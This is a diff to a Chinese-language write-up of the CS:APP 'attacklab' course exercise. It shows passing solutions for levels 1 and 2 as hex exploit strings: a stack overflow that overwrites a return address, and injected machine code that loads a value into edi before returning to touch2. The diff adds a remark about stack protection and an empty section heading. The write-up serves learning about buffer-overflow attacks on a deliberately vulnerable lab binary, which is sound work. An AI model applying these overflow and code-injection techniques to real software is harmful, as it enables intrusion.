@@ -66,7 +66,7 @@ Continuing. Type string:Touch1!: You called touch1() Valid solution for level 1 
     result  1:PASS:0xffffffff:ctarget:1:12 34 56 78 90 AB CD EF EF EF 12 34 56 78 90 AB CD EF EF EF 12 34 56 78 90 AB CD EF EF EF 12 34 56 78 90 AB CD EF EF EF C0 17 40 00 00 00 00 00  [Inferior 1 (process 11388) exited normally]
     
 ### 4.2 level 2
-这个其实也是栈溢出的原理，只不过在ret到touch2之前必须给传一个参数给edi。这个很纠结，起初我以为是不能执行栈上的数据的，后来网上搜了一下发现这个是可以执行stack中的数据的。
+这个其实也是栈溢出的原理，只不过在ret到touch2之前必须给传一个参数给edi。这个很纠结，起初我以为是不能执行栈上的数据的 (现在基本都有堆栈保护哈），后来网上搜了一下发现这个是可以执行stack中的数据的。
 如果可以执行stack中的数据，那么可以操作的空间就大了很多。两次ret可以解决，第一次ret到stack上执行指令，然后操作rsp，第二次ret到touch2，这是我第一次尝试的str：
 
     00 00 00 00 00 00 00 00
@@ -88,4 +88,6 @@ Continuing. Type string:Touch1!: You called touch1() Valid solution for level 1 
             lab     attacklab
             result  1:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 EC 17 40 00 00 00 00 00 48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 90 DC 61 55 00 00 00 00 
     [Inferior 1 (process 46846) exited normally]
+
+### 4.3 
 
